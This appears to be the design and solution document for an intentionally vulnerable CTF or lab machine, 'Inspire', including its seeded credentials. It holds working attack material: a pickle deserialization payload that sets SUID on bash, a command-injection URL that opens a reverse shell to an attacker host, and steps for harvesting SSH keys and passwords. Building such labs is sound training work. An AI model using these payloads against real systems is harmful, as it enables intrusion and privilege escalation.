# Inspire

> A solar weather and energy forecasting server for Sunspire. Inspire monitors weather patterns and predicts optimal energy generation across the solar grid.

---

## Overview

| Property | Value |
|----------|-------|
| Difficulty | Medium |
| OS | Ubuntu 24.04 |
| Services | SSH, HTTP (Apache), MySQL, Internal API |
| Initial Access | MySQL Anonymous Login → Password Leak |
| Privilege Escalation | Pickle Deserialization (Windmilled API) |
| Lateral Movement | inspire → forge (SSH key), inspire → crucible (password hint) |

---

## Users

| Username | Password | Notes |
|----------|----------|-------|
| inspire | aN8ivVL3 | Leaked via MySQL anonymous access |
| ops | 9ksP311p | Standard ops account |
| root | Mc8HYoDw | Obtainable via pickle deserialization |

---

## Services

### OpenSSH Server (:22)
- Standard SSH service for remote access
- Password authentication enabled

### Apache + Energy Heatmap (:80)
- PHP application for energy monitoring dashboard
- Location: `/var/www/html/`
- Vulnerable: jq command injection in `api.php`

### MySQL Server (:3306)
- Database for energy data storage
- **Anonymous login enabled** (vulnerability!)
- Database: `sunspire_energy`

### Windmilled API (127.0.0.1:5000)
- Flask application for wind turbine configuration
- Location: `/root/windmilled/`
- Systemd service: `windmilled.service`
- **Runs as root** (vulnerability!)
- Internal only - not accessible from external network

---

## Attack Vectors

### Initial Access

#### MySQL Anonymous Login → Password Leak

The MySQL server allows anonymous connections. The `system_config` table contains the inspire user password.

1. Connect to MySQL anonymously:
   ```bash
   mysql -h <target_ip>
   ```

2. Enumerate databases and tables:
   ```sql
   SHOW DATABASES;
   USE sunspire_energy;
   SHOW TABLES;
   ```

3. Query the configuration table:
   ```sql
   SELECT * FROM system_config;
   ```
   Output:
   ```
   +----+--------------+-------------+---------------------+
   | id | setting_name | setting_value | created_at        |
   +----+--------------+-------------+---------------------+
   | 1  | app_name     | Energy Heatmap | ...              |
   | 2  | version      | 2.1.4       | ...                 |
   | 3  | db_user      | inspire     | ...                 |
   | 4  | db_password  | aN8ivVL3    | ...                 |
   | 5  | maintenance_mode | false   | ...                 |
   +----+--------------+-------------+---------------------+
   ```

4. SSH as inspire user:
   ```bash
   ssh inspire@<target_ip>
   # Password: aN8ivVL3
   ```

### Privilege Escalation

#### Option 1: Pickle Deserialization (Windmilled API)

The Windmilled API runs as root on `127.0.0.1:5000`. The `/api/config/import` endpoint uses `pickle.loads()` on user-supplied data without validation.

1. Create a malicious pickle payload:
   ```python
   import pickle
   import base64
   import os

   class RCE:
       def __reduce__(self):
           return (os.system, ('chmod +s /bin/bash',))

   payload = base64.b64encode(pickle.dumps(RCE())).decode()
   print(payload)
   ```

2. Send the payload to the internal API (from inspire user):
   ```bash
   curl -X POST http://127.0.0.1:5000/api/config/import \
     -H "Content-Type: application/json" \
     -d '{"data": "<base64_payload>"}'
   ```

3. Get a root shell:
   ```bash
   /bin/bash -p
   ```

#### Option 2: jq Command Injection (Energy Heatmap)

The Energy Heatmap API has a command injection vulnerability in the region parameter.

1. Test command execution:
   ```bash
   curl "http://<target_ip>/api.php?region=north;id"
   ```

2. Get a reverse shell (as www-data):
   ```bash
   curl "http://<target_ip>/api.php?region=north;bash+-c+'bash+-i+>%26+/dev/tcp/<attacker_ip>/4444+0>%261'"
   ```

3. From www-data, pivot to inspire or escalate via Windmilled API.

---

## Lateral Movement

### inspire → forge (SSH Key)

After gaining root access via pickle deserialization, find the SSH private key in the Windmilled dev notes.

1. Read the dev notes file:
   ```bash
   cat /root/windmilled/dev_notes.txt
   ```

2. Extract the SSH private key between the markers:
   ```
   --- BEGIN SSH KEY ---
   -----BEGIN OPENSSH PRIVATE KEY-----
   ...
   -----END OPENSSH PRIVATE KEY-----
   --- END SSH KEY ---
   ```

3. Save the key and SSH to forge:
   ```bash
   echo "-----BEGIN OPENSSH PRIVATE KEY-----
   ...
   -----END OPENSSH PRIVATE KEY-----" > forge_key
   chmod 600 forge_key
   ssh -i forge_key forge@<forge_ip>
   ```

### inspire → crucible (Password Hint)

Root's `.bashrc` contains a hint about the crucible root password.

1. Check root's bashrc:
   ```bash
   cat /root/.bashrc
   ```

2. Find the comment:
   ```
   # crucible root hash: $6$rounds=5000$saltsalt$Mc8HYoDw.hashed.placeholder
   # Generated for emergency access, need to update to: Fj9$kL2mN
   ```

3. The password `Fj9$kL2mN` can be used for crucible.

---

## Scoring

### Services
| Service | Port | Check |
|---------|------|-------|
| SSH | 22 | OpenSSH running |
| Apache | 80 | HTTP 200 on index |
| MySQL | 3306 | MySQL connection |

### Control Files
| File | Owner |
|------|-------|
| /home/inspire/ctrl.txt | inspire |
| /root/ctrl.txt | root |

---

## Files of Interest

| Path | Description |
|------|-------------|
| /var/www/html/api.php | Command injection vulnerability |
| /var/www/html/config.php | Database credentials |
| /root/windmilled/app.py | Pickle deserialization vulnerability |
| /root/windmilled/dev_notes.txt | SSH key to forge |
| /root/.bashrc | Crucible password hint |

---

## Network Diagram

```
                    Internet
                        │
            ┌───────────┴───────────┐
            │                       │
      ┌─────▼─────┐          ┌──────▼──────┐
      │  :22 SSH  │          │  :80 HTTP   │
      │           │          │ (Apache)    │
      └─────┬─────┘          └──────┬──────┘
            │                       │
            │    ┌──────────────────┤
            │    │                  │
      ┌─────▼────▼─────┐    ┌───────▼───────┐
      │    INSPIRE     │    │    :3306      │
      │  (Ubuntu 24)   │◄───│   (MySQL)     │
      └────────────────┘    └───────────────┘
            │
            │ (internal only)
            ▼
      ┌─────────────────┐
      │ 127.0.0.1:5000  │
      │  (Windmilled)   │
      │  RUNS AS ROOT   │
      └─────────────────┘
```

---

## References

- [Pickle Deserialization](https://davidhamann.de/2020/04/05/exploiting-python-pickle/)
- [jq Command Injection](https://gtfobins.github.io/gtfobins/jq/)
- [MySQL Anonymous Access](https://dev.mysql.com/doc/refman/8.0/en/anonymous-users.html)
